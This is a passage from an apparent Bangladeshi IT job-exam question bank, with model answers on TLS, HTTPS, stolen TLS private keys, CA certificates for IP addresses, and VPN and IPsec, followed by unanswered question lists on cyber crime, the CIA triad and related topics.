   | Encryption modes | CBC and RC4 permitted, which enabled BEAST, POODLE and Lucky13 | AEAD only, that is AES-GCM and ChaCha20-Poly1305 |
   | Obsolete algorithms | RC4, 3DES, MD5, SHA-1, static RSA, compression all permitted | All removed |
   | Handshake privacy | Certificate sent in clear | Most of the handshake, including the certificate, is encrypted |
   | Renegotiation | Supported, and a source of vulnerabilities | Removed entirely |
   | Session resumption | Session IDs and tickets | PSK based resumption with 0-RTT |
   | Security | Secure if configured carefully; insecure if configured badly | Secure by design; there are almost no insecure configurations available |

   - The central improvement: TLS 1.3 removed choice. Every weak option that made TLS 1.2 dangerous when misconfigured — RC4, CBC modes, static RSA, compression, renegotiation, MD5 and SHA-1 — was deleted rather than deprecated, so a TLS 1.3 connection is secure by construction.
   - The practical benefit: one fewer round trip, which reduces page load time measurably, especially on mobile networks.
   - The one caution: 0-RTT resumption data is replayable, so it must be used only for idempotent requests.
7. **What is SSL, TLS, and HTTPs?** *[Ministry of Land Assistant Maintenance Engineer 2023 compact it 594 (ET: N/A)]*


   Answer:

   SSL and TLS:

   - SSL, Secure Sockets Layer, and TLS, Transport Layer Security, are cryptographic protocols that provide a secure channel between two applications over a network. TLS is the successor to SSL; SSL versions 2.0 and 3.0 are obsolete and insecure, and the current versions in use are TLS 1.2 and TLS 1.3.
   - They sit between the transport layer and the application layer, so any application protocol can be wrapped in them: HTTP becomes HTTPS, SMTP becomes SMTPS, FTP becomes FTPS, and the same applies to IMAP, LDAP and database connections.

   What they provide:
   - Confidentiality: all traffic is encrypted with a symmetric cipher such as AES, so an interceptor sees only ciphertext.
   - Integrity: a message authentication code detects any alteration in transit.
   - Authentication: the server proves its identity with an X.509 certificate issued by a trusted Certifying Authority, and the client may optionally do the same in mutual TLS.

   How the handshake works:
   - The client sends a ClientHello listing the TLS versions and cipher suites it supports, with a random value.
   - The server replies with a ServerHello choosing the version and cipher suite, its own random value, and its certificate.
   - The client validates the certificate: the signature chain up to a trusted root, the validity dates, the domain name, and the revocation status.
   - The two sides perform a key exchange, in modern practice ephemeral Diffie-Hellman or ECDHE, and derive a shared symmetric session key. Because the key is ephemeral, it gives forward secrecy: recording the traffic and later stealing the server's private key does not allow it to be decrypted.
   - Both sides confirm with a Finished message, and all application data is then encrypted with the symmetric session key.
   - This is hybrid encryption: asymmetric cryptography authenticates and agrees the key, and fast symmetric cryptography protects the data.

   HTTPS:
   - HTTPS is HyperText Transfer Protocol Secure: ordinary HTTP carried inside a TLS encrypted channel, on TCP port 443 instead of port 80.
   - The browser first completes the TLS handshake, validating the server's certificate and agreeing a session key, and every HTTP request and response thereafter is encrypted with it.
   - It gives the three services described above to web traffic: nobody in the path can read the page or the credentials, nobody can alter them undetected, and the user knows the site is genuine.
   - It should be used on every page, not only login pages, because an attacker who can modify any page can inject malicious content into it. HSTS should be enabled so that a downgrade to plain HTTP is impossible.

   Relationship in one line: SSL was the original protocol, TLS is its secure successor, and HTTPS is what you get when HTTP is carried over TLS.
8. **Attacker steals private key of website that uses transport layer security and remains undetected what can be done with private key?** *[Combined Bank Assistant Programmer 09.06.2023 compact it 493 (ET: N/A)]*


   Answer: If an attacker steals a website's TLS private key and remains undetected, the consequences depend critically on whether the site uses forward secrecy.

   What the attacker can do:
   - Impersonate the website completely: with the private key and the corresponding certificate, he can present himself as the genuine site. The browser validates the certificate successfully and shows the padlock, so the user has no indication whatever that the site is false. This is the most serious consequence.
   - Mount an undetectable man in the middle attack: combined with DNS poisoning, ARP spoofing, BGP hijacking or a rogue access point, he can sit between the users and the real site, decrypt everything, read and alter it, and re-encrypt it onward. Credentials, session cookies, card details and personal data are all exposed.
   - Decrypt recorded past traffic, but only if the connection used RSA key transport rather than ephemeral Diffie-Hellman. In RSA key transport the client encrypts the session key with the server's public key, so anyone with the private key can recover every session key from a recorded capture, retrospectively, going back as far as the recordings go.
   - Forge digital signatures made with that key, and sign content or software as the organisation.
   - Set up convincing phishing sites that pass every certificate check.

   What limits the damage:
   - Forward secrecy is the decisive factor. If the server uses ephemeral Diffie-Hellman, that is ECDHE or DHE, which is mandatory in TLS 1.3 and should be configured in TLS 1.2, the session key is derived from a temporary key pair that is discarded after the session and never transmitted. Stealing the long term private key therefore does not allow past recorded sessions to be decrypted. It still allows impersonation of future connections.
   - The attacker cannot decrypt future connections passively either; he must actively intercept them, which requires a position in the network path.

   How to manage it:
   - Revoke the certificate immediately through the Certifying Authority, and publish the revocation through the CRL and OCSP. Note that revocation checking is imperfect in browsers, so this is necessary but not sufficient.
   - Generate a completely new key pair and obtain a new certificate. Never reuse the compromised key.
   - Enable OCSP stapling with the must-staple flag, so that clients reliably learn of the revocation.
   - Investigate how the key was stolen and close that route, since the same weakness will otherwise be used again.
   - Monitor Certificate Transparency logs for certificates issued for the domain, which detects misissuance.

   How to prevent it:
   - Store private keys in a Hardware Security Module or a TPM, so that the key can be used for signing but can never be extracted.
   - Restrict file permissions, encrypt the key at rest with a passphrase, and never place it in a code repository or a backup that is not itself protected.
   - Enforce forward secrecy by configuring ECDHE cipher suites only, or by using TLS 1.3, which makes it mandatory. This is the single most valuable measure, because it limits an undetected compromise to future active attacks rather than the entire past.
   - Use short certificate lifetimes, now typically 90 days, so that a stolen key becomes useless quickly.
   - Rotate keys on a schedule and on any suspicion, and audit access to the key material.
9. **(a) Write the full form of those: (i) SSL (ii) TSL** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 819 (ET: BUET)]*


   Answer:

   - SSL: Secure Sockets Layer. A cryptographic protocol developed by Netscape to provide encrypted communication between a client and a server. Versions 2.0 and 3.0 are both obsolete and insecure, and it has been replaced by TLS.
   - TLS, which the question writes as TSL: Transport Layer Security. The successor to SSL, standardised by the IETF. The versions in current use are TLS 1.2, published in 2008, and TLS 1.3, published in 2018.

   - Both provide the same three services: confidentiality through symmetric encryption, integrity through a message authentication code, and server authentication through an X.509 certificate.
   - The term "SSL certificate" is still used colloquially, but what is actually issued and used today is a TLS certificate.
10. **(b) Which IP address may have secured via SSL and publicly by the Certificate Authority(CA). If secured Write Yes or otherwise No.** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 819 (ET: BUET)]*
   1.1.1.1
   8.8.4.1
   192.168.10.2
   8.8.8.8
   172.16.8.1
   10.0.0.1


   Answer: A certificate issued by a public Certifying Authority can be granted only for a publicly routable IP address or a public domain name. A private RFC 1918 address cannot be validated by a public CA, because it is not globally unique and no one can prove ownership of it.

   | IP address | Type | Can it be secured by a public CA certificate |
   |---|---|---|
   | 1.1.1.1 | Public, Cloudflare DNS | Yes |
   | 8.8.4.1 | Public | Yes |
   | 192.168.10.2 | Private, 192.168.0.0/16 | No |
   | 8.8.8.8 | Public, Google DNS | Yes |
   | 172.16.8.1 | Private, 172.16.0.0/12 | No |
   | 10.0.0.1 | Private, 10.0.0.0/8 | No |

   Reasoning:
   - The private ranges defined by RFC 1918 are 10.0.0.0/8, 172.16.0.0 to 172.31.255.255 and 192.168.0.0/16. The same private address exists simultaneously inside millions of separate networks, so no Certifying Authority can verify that a particular applicant controls it, and the CA/Browser Forum rules explicitly forbid issuing publicly trusted certificates for them. Since 2016 no public CA may issue a certificate for a private IP address or an internal server name.
   - A public IP address is globally unique and its control can be demonstrated, so a certificate may be issued for it, although IP address certificates are uncommon and only a few CAs offer them; the normal practice is to certify a domain name instead.
   - Private addresses can still be secured, but only by an internal or private Certifying Authority whose root certificate the organisation installs on its own machines. Such a certificate is trusted inside the organisation and nowhere else, which is exactly the correct arrangement for internal servers.
   - The general rule to state: public trust requires public, verifiable ownership. Anything that cannot be uniquely and verifiably owned cannot be publicly certified.
11. **HTTPs কীভাবে একটি Website-এর সুরক্ষা দেয়? ব্লক ডায়াফ্রামের মাধ্যমে উত্তর দিন।** *[40th BCS 2020 compact it 971 (ET: BPSC)]*


   Answer: HTTPS protects a website by carrying ordinary HTTP inside a TLS encrypted channel, which gives confidentiality, integrity and server authentication.

   Block diagram:

   ```mermaid
   graph LR
       A["Browser"] --> B["HTTP request in plain form"]
       B --> C["TLS layer: encrypt with the session key, add MAC"]
       C --> D["TCP port 443"]
       D --> E["Internet, where only ciphertext is visible"]
       E --> F["Web server: TCP 443"]
       F --> G["TLS layer: verify MAC, decrypt"]
       G --> H["HTTP request delivered to the application"]
       I["Server's X.509 certificate from a trusted CA"] -.-> C
   ```

   The handshake, which establishes the protection:

   ```mermaid
   sequenceDiagram
       participant B as Browser
       participant S as Web Server
       B->>S: ClientHello: TLS versions, cipher suites, client random
       S->>B: ServerHello: chosen version and cipher, server random, X.509 certificate
       B->>B: Validate the certificate: CA signature chain, dates, domain name, revocation
       B->>S: Key exchange, ECDHE; both derive the same session key
       S->>B: Finished
       B->>S: Finished
       Note over B,S: All HTTP traffic from here is encrypted with AES using the session key
   ```

   How each protection is delivered:
   - Confidentiality: after the handshake, every request and response is encrypted with a symmetric cipher such as AES-256-GCM. An interceptor on public Wi-Fi, at the ISP or anywhere on the path sees only ciphertext, so passwords, card numbers and page content are unreadable.
   - Integrity: each TLS record carries a message authentication code. Any alteration in transit fails verification and the connection is aborted, so an attacker cannot inject advertisements, malware or false content into the page.
   - Authentication of the server: the X.509 certificate is signed by a Certifying Authority whose root the browser already trusts. The browser checks the signature chain, the validity dates, the domain name and the revocation status. This proves the user is talking to the genuine site and not to a counterfeit, which is what defeats phishing and pharming at the technical level.
   - Forward secrecy: because the session key is derived from an ephemeral Diffie-Hellman exchange and then discarded, recording the traffic and later stealing the server's private key does not allow it to be decrypted.

   Supporting measures that complete the protection: HSTS, so the browser will not fall back to plain HTTP; redirecting all port 80 requests to 443; TLS 1.2 or 1.3 only with weak ciphers disabled; `Secure` and `HttpOnly` cookie flags; and disciplined certificate renewal.

## Cyber Crime & Security (9)

1. **সাইবার অপরাধের প্রকারভেদ পরিবেশের স্থায়িত্ব বর্ণনা করুন।** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

2. **Why is cyber security important? What are the common types of cyber threats? Explain cyber security measures.** *[Senior Officer IT (Job ID: 10225) Date: 22-05-2026 (ET: N/A)]*

3. **Hacking a system without cracking the system, only for finding bugs and vulgarities is called?** *[BCC Assistant Programmer 11.11.2023 compact it 545 (ET: N/A)]*

4. **What is Cybercrime? Cybercrime রোধে প্রয়োজনীয় পদক্ষেপ গুলো লিখ।** *[NPCBL Junior Assistant Manager (ICT) 2022 compact it 642 (ET: BUET)]*

5. **What is Cyber space? Write some threats of cyber space.** *[DESCO Assistant Engineer (CSE) 10.09.2022 compact it 699 (ET: BUET)]*

6. **Write the cyber security threats.** *[BARI Assistant Maintenance Engineer 26.08.2022 compact it 702 (ET: N/A)]*

7. **What is Vulnerability?** *[BKSP Assistant Programmer 03.12.2022 compact it 730 (ET: N/A)]*

8. **What is cyber threat intelligence database? What is the use of this in corporate office network?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 752 (ET: N/A)]*

9. **সাইবার অপরাধ কি? ৮টি সাইবার অপরাধ এর নাম লিখুন। সাইবার অপরাধ দূর করার জন্য ৬টি পন্থার নাম লিখুন।** *[BREB Junior Assistant Manager (ICT) 2021 compact it 948-949 (ET: N/A)]*

## Security Principles (CIA Triad) (7)

1. What does CIA stand for in information security? Explain each component briefly. *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

2. What is authentication and authorization? What is the CIA triad in cyber security? How does it work? *[Combined Bank Officer (IT) 03.01.2026 debug it (ET: N/A)]*

3. **(a) What is the CIA triad of information system? Briefly describe its each component.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

4. **Describe how the principles of Confidentiality, Integrity, and Availability work together to protect organizational data, and provide one real-world example of a security breach where one or more of these principles were compromised.** *[Combined Bank Senior Officer (IT) 17.10.2025 compact it 1428 (ET: E-Zone)]*

5. **What is CIA Triad?** *[EGCB Sub-Divisional Engineer (ICT) 28.01.2023 compact it 563 (ET: BUET)], [Teletalk Assistant Manager (IT) 2023 compact it 465 (ET: N/A)]*

6. **Preserving confidentiality integrity and availability of data is a restatement of the concern over falsification, interception, masquerade and denial of service. Explain how the first three concepts relate to the last four.** *[Bangladesh Bank Assistant Programmer 03.02.2023 compact it 435 (ET: BIBM)]*

7. **Information System কী? Information Syetem -এর সুরক্ষায় প্রয়োজনীয় পদক্ষেপ সংক্ষেপে বর্ণনা করুন?** *[41th BCS 2021 compact it 883-884 (ET: N/A)]*

## VPN & Tunneling Protocols (IPsec, SSL VPN) (6)

1. **What is the purpose of VPN used in computer security?** *[Dhaka Mass Transit Company Limited (DMTCL) Assistant Engineer (ICT) 27.01.2023 compact it 476 (ET: N/A)]*


   Answer: The purpose of a VPN in computer security is to create an encrypted tunnel across an untrusted public network, so that data can be exchanged as though the two endpoints were on the same private network.

   - A Virtual Private Network creates an encrypted tunnel across a public network such as the Internet, so that two endpoints can exchange data as though they were on the same private network.
   - The data is encapsulated, that is the original packet is placed inside a new packet, and encrypted, so that anyone intercepting it on the public network sees only the outer header and an unreadable payload.

   How it works:
   - Step 1: the two endpoints authenticate each other, using a pre-shared key, digital certificates or user credentials.
   - Step 2: they negotiate the encryption and integrity algorithms and derive session keys, typically using IKE for IPsec or a TLS handshake for an SSL VPN.
   - Step 3: the tunnel is established.
   - Step 4: each outgoing packet is encrypted and encapsulated in a new IP packet addressed to the far tunnel endpoint.
   - Step 5: the far end decapsulates and decrypts it and forwards the original packet into the private network.

   Protocols:
   - IPsec, which operates at the network layer, layer 3, with AH for authentication and ESP for encryption, and two modes: transport mode, which protects only the payload, and tunnel mode, which protects the whole original packet and is used for site to site VPNs.
   - SSL and TLS VPN, which operates at the application layer and can run through a browser, so no client software is needed. It passes firewalls easily because it uses port 443.
   - Others: OpenVPN, WireGuard, which is modern, fast and simple, L2TP over IPsec, and the obsolete and insecure PPTP.

   Purposes and benefits:
   - Confidentiality on an untrusted network, which is the primary purpose; public Wi-Fi becomes safe to use.
   - Secure remote access for staff working from home or travelling, without exposing internal services to the Internet.
   - Connecting branch offices to head office over the Internet at a small fraction of the cost of a leased line.
   - Authentication, so that only authorised users and sites can join the private network.
   - Integrity, so that traffic cannot be altered in transit.
   - Hiding the user's real IP address and location, and bypassing geographic restrictions and censorship.
   - Cost saving compared with dedicated circuits, and easy scalability.

   Limitations: it adds encryption overhead and therefore some latency; the VPN concentrator is a single point of failure and a high value target; a compromised endpoint brings the infection straight into the private network; and split tunnelling, if misconfigured, leaks traffic outside the tunnel.
2. **In which layer IPsec works?** *[BCC Assistant Programmer 11.11.2023 compact it 547 (ET: N/A)]*


   Answer: IPsec works at the Network layer, that is Layer 3 of the OSI model, and correspondingly at the Internet layer of the TCP/IP model.

   - Because it operates at layer 3, it protects every packet regardless of the application above it, and applications need no modification at all to benefit from it. This is its principal advantage over TLS, which works at the application and transport boundary and must be built into each application.
   - Its two protocols: AH, the Authentication Header, IP protocol 51, which provides integrity and authentication but no encryption; and ESP, the Encapsulating Security Payload, IP protocol 50, which provides encryption as well and is what is actually used.
   - Its two modes: transport mode, which encrypts only the payload and leaves the original IP header intact, used for host to host communication; and tunnel mode, which encrypts the entire original packet and adds a new IP header, used for site to site VPNs and gateway to gateway links.
   - Key management is performed by IKE, the Internet Key Exchange, over UDP port 500, and NAT traversal uses UDP port 4500.
   - IPsec is mandatory in the IPv6 specification and optional in IPv4, and it is the standard protocol for site to site VPNs between offices.
3. **What is VPN? How it is working.** *[BOF Assistant Programmer 2022 compact it 732 (ET: MIST)]*


   Answer:

   - A Virtual Private Network creates an encrypted tunnel across a public network such as the Internet, so that two endpoints can exchange data as though they were on the same private network.
   - The data is encapsulated, that is the original packet is placed inside a new packet, and encrypted, so that anyone intercepting it on the public network sees only the outer header and an unreadable payload.

   How it works:
   - Step 1: the two endpoints authenticate each other, using a pre-shared key, digital certificates or user credentials.
   - Step 2: they negotiate the encryption and integrity algorithms and derive session keys, typically using IKE for IPsec or a TLS handshake for an SSL VPN.
   - Step 3: the tunnel is established.
   - Step 4: each outgoing packet is encrypted and encapsulated in a new IP packet addressed to the far tunnel endpoint.
   - Step 5: the far end decapsulates and decrypts it and forwards the original packet into the private network.

   Protocols:
   - IPsec, which operates at the network layer, layer 3, with AH for authentication and ESP for encryption, and two modes: transport mode, which protects only the payload, and tunnel mode, which protects the whole original packet and is used for site to site VPNs.
   - SSL and TLS VPN, which operates at the application layer and can run through a browser, so no client software is needed. It passes firewalls easily because it uses port 443.
   - Others: OpenVPN, WireGuard, which is modern, fast and simple, L2TP over IPsec, and the obsolete and insecure PPTP.

   Purposes and benefits:
   - Confidentiality on an untrusted network, which is the primary purpose; public Wi-Fi becomes safe to use.
   - Secure remote access for staff working from home or travelling, without exposing internal services to the Internet.
   - Connecting branch offices to head office over the Internet at a small fraction of the cost of a leased line.
   - Authentication, so that only authorised users and sites can join the private network.
   - Integrity, so that traffic cannot be altered in transit.
   - Hiding the user's real IP address and location, and bypassing geographic restrictions and censorship.
   - Cost saving compared with dedicated circuits, and easy scalability.

   Limitations: it adds encryption overhead and therefore some latency; the VPN concentrator is a single point of failure and a high value target; a compromised endpoint brings the infection straight into the private network; and split tunnelling, if misconfigured, leaks traffic outside the tunnel.
4. **(a) How can VPN provide secure communication platform? Explain site-to-site VPN and remote-access VPN using necessary figures.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 800 (ET: N/A)]*


   Answer:

   How a VPN provides a secure communication platform:
   - Encryption: every packet entering the tunnel is encrypted with a strong symmetric cipher such as AES-256, so anyone intercepting it on the public network sees only ciphertext. This gives confidentiality on a medium that is fundamentally untrustworthy.
   - Authentication: the endpoints prove their identity to each other before the tunnel is established, using pre-shared keys, digital certificates or user credentials with multi-factor authentication. An unauthorised party cannot join the private network.
   - Integrity: a message authentication code is attached to every packet, so any alteration in transit is detected and the packet is discarded.
   - Encapsulation: the original packet, including its private IP addresses, is placed inside a new packet addressed to the far tunnel endpoint. The internal addressing is therefore invisible from outside, and private addresses can be routed across the public Internet.
   - Anti-replay protection: sequence numbers prevent an attacker from capturing a valid packet and replaying it later.
   - Key management: IKE negotiates and periodically rekeys the session, so that a compromised key protects only a limited amount of traffic, and ephemeral Diffie-Hellman provides forward secrecy.

   Site to site VPN:
   - It connects two entire networks, typically a branch office and head office, through a permanent tunnel between their gateway devices. Individual hosts know nothing about it; they simply route to the other network as if it were local.
   - It normally uses IPsec in tunnel mode, and the tunnel is always up.

   ```mermaid
   graph LR
       A["Branch LAN 192.168.2.0/24"] --> B["Branch VPN Gateway"]
       B -->|"IPsec tunnel over the Internet"| C["Head Office VPN Gateway"]
       C --> D["Head Office LAN 192.168.1.0/24"]
   ```

   Remote access VPN:
   - It connects a single user's device to the organisation's network, wherever that user happens to be. The tunnel is created on demand when the user connects and torn down afterwards.
   - It uses either an SSL/TLS VPN, which may run through a browser and passes firewalls easily on port 443, or IPsec with a client.

   ```mermaid
   graph LR
       A["Remote user laptop at home"] -->|"Encrypted tunnel, TLS or IPsec"| B["VPN Concentrator at head office"]
       B --> C["Internal LAN: file server, application, database"]
       D["Mobile phone"] -->|"Encrypted tunnel"| B
   ```

   Comparison:

   | Point | Site to site VPN | Remote access VPN |
   |---|---|---|
   | Connects | Two whole networks | One device to a network |
   | Endpoints | Router or firewall at each site | Client software on the device, and a concentrator at the office |
   | Client software | None needed on individual hosts | Required on each device, unless it is a browser based SSL VPN |
   | Tunnel | Permanent, always established | On demand, created when the user connects |
   | Number of users | All users of both sites, transparently | One user per tunnel |
   | Typical protocol | IPsec in tunnel mode | SSL/TLS VPN, or IPsec with a client |
   | Authentication | Pre-shared key or device certificate | User credentials with multi-factor authentication |
   | Typical use | Linking branch offices, connecting to a data centre or a cloud region | Staff working from home or travelling, and vendor support access |
5. **What is VPN? Difference between site to site VPN and Remote access VPN.** *[RAKUB Network System Engineer (PO) 10.10.2021 compact it 840 (ET: N/A)]*


   Answer:

   What a VPN is:

   - A Virtual Private Network creates an encrypted tunnel across a public network such as the Internet, so that two endpoints can exchange data as though they were on the same private network.
   - The data is encapsulated, that is the original packet is placed inside a new packet, and encrypted, so that anyone intercepting it on the public network sees only the outer header and an unreadable payload.

   How it works:
   - Step 1: the two endpoints authenticate each other, using a pre-shared key, digital certificates or user credentials.
   - Step 2: they negotiate the encryption and integrity algorithms and derive session keys, typically using IKE for IPsec or a TLS handshake for an SSL VPN.
   - Step 3: the tunnel is established.
   - Step 4: each outgoing packet is encrypted and encapsulated in a new IP packet addressed to the far tunnel endpoint.
   - Step 5: the far end decapsulates and decrypts it and forwards the original packet into the private network.

   Protocols:
   - IPsec, which operates at the network layer, layer 3, with AH for authentication and ESP for encryption, and two modes: transport mode, which protects only the payload, and tunnel mode, which protects the whole original packet and is used for site to site VPNs.
   - SSL and TLS VPN, which operates at the application layer and can run through a browser, so no client software is needed. It passes firewalls easily because it uses port 443.
   - Others: OpenVPN, WireGuard, which is modern, fast and simple, L2TP over IPsec, and the obsolete and insecure PPTP.

   Purposes and benefits:
   - Confidentiality on an untrusted network, which is the primary purpose; public Wi-Fi becomes safe to use.
   - Secure remote access for staff working from home or travelling, without exposing internal services to the Internet.
   - Connecting branch offices to head office over the Internet at a small fraction of the cost of a leased line.
   - Authentication, so that only authorised users and sites can join the private network.
   - Integrity, so that traffic cannot be altered in transit.
   - Hiding the user's real IP address and location, and bypassing geographic restrictions and censorship.
   - Cost saving compared with dedicated circuits, and easy scalability.

   Limitations: it adds encryption overhead and therefore some latency; the VPN concentrator is a single point of failure and a high value target; a compromised endpoint brings the infection straight into the private network; and split tunnelling, if misconfigured, leaks traffic outside the tunnel.

   Difference between site to site VPN and remote access VPN:

   | Point | Site to site VPN | Remote access VPN |
   |---|---|---|
   | Purpose | Connects two entire networks permanently | Connects an individual device to a network on demand |
   | Endpoints | A gateway, router or firewall at each site | Client software on the user's device, and a VPN concentrator at the office |
   | Client software | Not needed on individual hosts; it is transparent to them | Required on each device, unless a browser based SSL VPN is used |
   | Tunnel state | Always up | Established when the user connects and torn down afterwards |
   | Users served | All users at both sites at once | One user per tunnel |
   | Protocol normally used | IPsec in tunnel mode | SSL/TLS VPN, or IPsec with a client |
   | Authentication | Pre-shared key or device certificate | User credentials, preferably with multi-factor authentication |
   | Scalability | Limited by the number of sites and the mesh of tunnels | Limited by the concentrator's capacity and licences |
   | Management | Configured once by the network team | Requires user provisioning, client distribution and support |
   | Typical use | Branch office to head office, office to data centre, office to cloud | Staff working from home, travelling users, vendor support access |
   | Sub-types | Intranet VPN between an organisation's own sites, and extranet VPN to a partner | Full tunnel, in which all traffic goes through the office, and split tunnel, in which only corporate traffic does |

   - The two are complementary, and most organisations use both: site to site tunnels to link the branches permanently, and remote access for individual staff.
6. **What is VPN? Why we use it?** *[Sonali Bank Ltd. Officer IT 2021 compact it 909 (ET: N/A)]*


   Answer:

   - A Virtual Private Network creates an encrypted tunnel across a public network such as the Internet, so that two endpoints can exchange data as though they were on the same private network.
   - The data is encapsulated, that is the original packet is placed inside a new packet, and encrypted, so that anyone intercepting it on the public network sees only the outer header and an unreadable payload.

   How it works:
   - Step 1: the two endpoints authenticate each other, using a pre-shared key, digital certificates or user credentials.
   - Step 2: they negotiate the encryption and integrity algorithms and derive session keys, typically using IKE for IPsec or a TLS handshake for an SSL VPN.
   - Step 3: the tunnel is established.
   - Step 4: each outgoing packet is encrypted and encapsulated in a new IP packet addressed to the far tunnel endpoint.
   - Step 5: the far end decapsulates and decrypts it and forwards the original packet into the private network.

   Protocols:
   - IPsec, which operates at the network layer, layer 3, with AH for authentication and ESP for encryption, and two modes: transport mode, which protects only the payload, and tunnel mode, which protects the whole original packet and is used for site to site VPNs.
   - SSL and TLS VPN, which operates at the application layer and can run through a browser, so no client software is needed. It passes firewalls easily because it uses port 443.
   - Others: OpenVPN, WireGuard, which is modern, fast and simple, L2TP over IPsec, and the obsolete and insecure PPTP.

   Purposes and benefits:
   - Confidentiality on an untrusted network, which is the primary purpose; public Wi-Fi becomes safe to use.
   - Secure remote access for staff working from home or travelling, without exposing internal services to the Internet.
   - Connecting branch offices to head office over the Internet at a small fraction of the cost of a leased line.
   - Authentication, so that only authorised users and sites can join the private network.
   - Integrity, so that traffic cannot be altered in transit.
   - Hiding the user's real IP address and location, and bypassing geographic restrictions and censorship.
   - Cost saving compared with dedicated circuits, and easy scalability.

   Limitations: it adds encryption overhead and therefore some latency; the VPN concentrator is a single point of failure and a high value target; a compromised endpoint brings the infection straight into the private network; and split tunnelling, if misconfigured, leaks traffic outside the tunnel.

## Critical Information Infrastructure (CII) & Cyber Governance (3)

1. What is CII? How many CII organizations? Name 10 CII organization name. *[BEPRC Assistant Programmer 08.08.2026 (ET: N/A)]*

2. **CTC কী? কী কাজে ব্যবহার হয়?** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

3. **(c) Briefly write about the cybersecurity laws of Bangladesh.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

## Cryptography & Network Security Scenarios (3)

1. Cryptography and Network Security Scenario: [BSCCPL AME 21-08-2026 (BUET)] Cox's Bazar wants to send confidential information to Kuakata through an insecure network. Cox's Bazar first generates a hash value using a Hash Function (H). The message, hash value, and routing data are combined and encrypted using Kuakata's Public Key (Ku). The encrypted ciphertext is transmitted through the network. During transmission, an attacker positioned between Cox's Bazar and Kuakata intercepts the encrypted data. The attacker captures the ciphertext and deliberately blocks it so that Kuakata never receives the message. However, the attacker is unable to read or decrypt the original message because Kuakata's Private Key (\text{Ku}^{-1}) is not available to the attacker. Kuakata is expected to decrypt the received ciphertext using its Private Key (\text{Ku}^{-1}) and verify the integrity of the message using the hash value whenever the message is successfully delivered. Questions: (a) Is there any digital signature? (b) Identify attack. (c) How to identify origin of the? (d) How to manage the attack. (e) Does the described communication provide a Digital Signature? Give reasons. If not, explain how Cox's Bazar can add a Digital Signature using Cox's Bazar's Private Key (\text{Kc}^{-1}) and verification using Cox's Bazar's Public Key (\text{Kc}). (f) Which security services are provided by the system among Confidentiality, Integrity, Authentication, Non-repudiation, and Availability? (g) Suggest suitable techniques or mechanisms to protect the communication against the attack identified in question (b). (h) Draw a complete communication diagram showing \text{Message} \to \text{Hash} \to \text{Routing Data} \to \text{Encryption with Ku} \to \text{Attacker} \to \text{Kuakata} \to \text{Decryption with } \text{Ku}^{-1}, and indicate the keys used in each stage.

2. **Explain Cyber Attack Scenario-** *[DPDC Junior Assistant Manager (JAM) 27.06.2025 compact it 1441 (ET: BUET)]*

3. **Imagine yu should design a secure transmission protocol for sending data from one node to another node. You should divide the message in the multiple packets and this packets will be using different path so that any one cannot decrypt the message.** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 756 (ET: N/A)]*

## Email & Messaging Security (Spam, Phishing) (2)

1. **Unsoliciated email is called?** *[BARI Assistant Maintenance Engineer 10.05.2024 compact it 1462 (ET: N/A)]*

2. **If you downloaded the email, you will be able to face the problem. Which attack do you face?** *[BCC Assistant Programmer 11.11.2023 compact it 546 (ET: N/A)]*

## Buffer Overflow & Software Vulnerabilities (1)

1. **Explain buffer overflow attack with an example.** *[BTCL Assistant Manager (Technical) 2023 compact it 592 (ET: BUET)]*
